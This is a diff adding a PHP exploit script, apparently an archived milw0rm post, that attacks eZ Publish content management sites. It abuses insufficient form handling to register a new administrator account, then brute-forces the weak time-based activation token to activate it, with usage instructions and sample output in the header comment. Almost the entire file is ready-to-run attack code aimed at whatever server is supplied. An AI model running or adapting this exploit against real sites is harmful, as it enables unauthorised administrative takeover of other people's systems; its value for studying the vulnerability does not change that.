@@ -1,0 +1,181 @@
+<?php
+
+/*
+	eZ Publish privilege escalation and weak activation token for new user exploit by s4avrd0w [s4avrd0w@p0c.ru]
+	Versions affected >= 3.5.6
+	eZ Publish privilege escalation resolved in 3.9.5, 3.10.1, 4.0.1
+	More info: http://ez.no/developer/security/security_advisories/ez_publish_3_9/ezsa_2008_003_insufficient_form_handling_made_privilege_escalation_possible
+
+	eZ Publish weak activation token for new user not resolved now (zero-day).
+	Vulnerable code in the version 3.9.2:
+		$hash = md5( mktime( ) . $user->attribute( 'contentobject_id' ) );
+	Vulnerable code in the version 4.0.1:
+		$hash = md5( time() . $user->attribute( 'contentobject_id' ) );
+	
+	* tested on version 3.9.2
+
+	usage: 
+
+	# ./eZPublish_create_admin_exploit.php -u=username -p=password -s=EZPublish_server [ -e=email -t=timestamp ]
+
+	The options are required:
+	 -u Login of the new admin on eZ Publish
+	 -p Password of the new admin on eZ Publish
+	 -s Target for privilege escalation
+
+	The options are optional:
+	 -t Unix timestamp for a date on target eZ Publish server
+		This option is required in a case when on a target server incorrect time is established.
+		Default is unix timestamp for a date on local computer.
+	 -e Email of the new admin on eZ Publish
+		Default is anybody@localhost.localhost.
+
+	example:
+
+	# ./eZPublish_create_admin_exploit.php -u=admin -p=P@ssw0rd -s=http://127.0.0.1/ -e=my_mail@google.com -t=1229194235
+	[+] Phase 1 successfully finished
+	[+] Use timestamp: 1229194235
+	[+] Begin bruteforce...
+	....................
+	[+] Phase 2 successfully finished
+
+	[+] Exploiting is finished successfully
+	[+] Login in system using admin/P@ssw0rd
+
+*/
+
+function help_argc($script_name)
+{
+print "
+usage:
+
+# ./".$script_name." -u=username -p=password -s=EZPublish_server [ -e=email -t=timestamp ]
+
+The options are required:
+ -u Login of the new admin on eZ Publish
+ -p Password of the new admin on eZ Publish
+ -s Target for privilege escalation
+
+The options are optional:
+ -t Unix timestamp for a date on target eZ Publish server
+	(default is unix timestamp for a date on local computer)
+ -e Email of the new admin on eZ Publish
+	(default is anybody@localhost.localhost)
+
+example:
+
+# ./".$script_name." -u=admin -p=P@ssw0rd -s=http://127.0.0.1/
+[+] Phase 1 successfully finished
+[+] Use timestamp: 1229194235
+[+] Begin bruteforce...
+....................
+[+] Phase 2 successfully finished
+
+[+] Exploiting is finished successfully
+[+] Login in system using admin/P@ssw0rd
+";
+}
+
+function successfully($login,$password)
+{
+print "
+[+] Phase 2 successfully finished
+
+[+] Exploiting is finished successfully
+[+] Login in system using $login/$password
+";
+}
+
+if (($argc != 4 && $argc != 5 && $argc != 6) || in_array($argv[1], array('--help', '-help', '-h', '-?')))
+{
+	help_argc($argv[0]);
+	exit(0);
+}
+else
+{
+	$ARG = array(); 
+	foreach ($argv as $arg) { 
+		if (strpos($arg, '-') === 0) { 
+			$key = substr($arg,1,1);
+			if (!isset($ARG[$key])) $ARG[$key] = substr($arg,3,strlen($arg)); 
+		} 
+	}
+
+	if ($ARG[u] && $ARG[p] && $ARG[s])
+	{
+
+		if (!$ARG[e]) $ARG[e] = "anybody@localhost.localhost";
+
+			$post_fields = array(
+				'ContentObjectAttribute_data_user_login_30' => $ARG[u],
+				'ContentObjectAttribute_data_user_password_30' => $ARG[p],
+				'ContentObjectAttribute_data_user_password_confirm_30' => $ARG[p],
+				'ContentObjectAttribute_data_user_email_30' => $ARG[e],
+				'UserID' => '14',
+				'PublishButton' => '1'
+			);
+
+		$headers = array(
+		    'User-Agent' => 'Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.8.1.14) Gecko/20080404 Firefox/2.0.0.14',
+		    'Referer' => $ARG[s]
+		);
+
+		$res_http = new HttpRequest($ARG[s]."/user/register", HttpRequest::METH_POST);
+		$res_http->addPostFields($post_fields);
+		$res_http->addHeaders($headers);
+		try {
+			if ($ARG[t]) { $time = $ARG[t]; } else { $time = mktime( ); }
+    			$response = $res_http->send()->getBody();
+
+			if (eregi("success", $response) || eregi("Fatal error", $response))
+			{
+				print "[+] Phase 1 successfully finished\n";
+				print "[+] Use timestamp: $time\n";
+				print "[+] Begin bruteforce...\n";
+
+				for ($i = $time; $i<$time+100; $i++)
+				{
+					print ".";
+					$hash = md5( $i . "14" );
+					$res_http = new HttpRequest($ARG[s]."/user/activate/".$hash, HttpRequest::METH_GET);
+					$res_http->addHeaders($headers);
+					try {
+						$response = $res_http->send()->getBody();
+
+						if (eregi("Your account is now activated", $response))
+						{
+							successfully($ARG[u],$ARG[p]);
+							exit(1);
+						}
+
+
+					} catch (HttpException $exception) {
+						print "\n[-] Not connected";
+						exit(0);
+					}
+				}
+				print "\n[-] Exploit failed";
+			}
+			else
+			{
+				print "[-] Exploit failed";
+			}
+
+		} catch (HttpException $exception) {
+
+			print "[-] Not connected";
+			exit(0);
+
+		}
+
+	}
+	else
+	{
+		help_argc($argv[0]);
+		exit(0);
+	} 
+}
+
+?>
+
+# milw0rm.com [2008-12-15]
